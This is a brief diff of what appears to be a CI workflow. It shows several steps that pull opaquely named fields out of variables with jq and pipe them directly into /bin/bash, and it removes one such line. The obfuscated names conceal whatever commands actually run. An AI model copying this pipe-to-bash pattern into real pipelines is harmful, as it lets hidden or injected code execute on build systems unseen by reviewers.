@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$u41" | jq -r .rybhz0 | /bin/bash
           echo $davxm05068 | jq -r .vnn0 | /bin/bash
           echo $vxs0 | jq -r .psgfa13 | /bin/bash
-          printf '%s' "$umzhx19" | jq -r .zlsts7 | /bin/bash
           echo $ubya1 | jq -r .pc152 | /bin/bash
 
       - name: Archive results
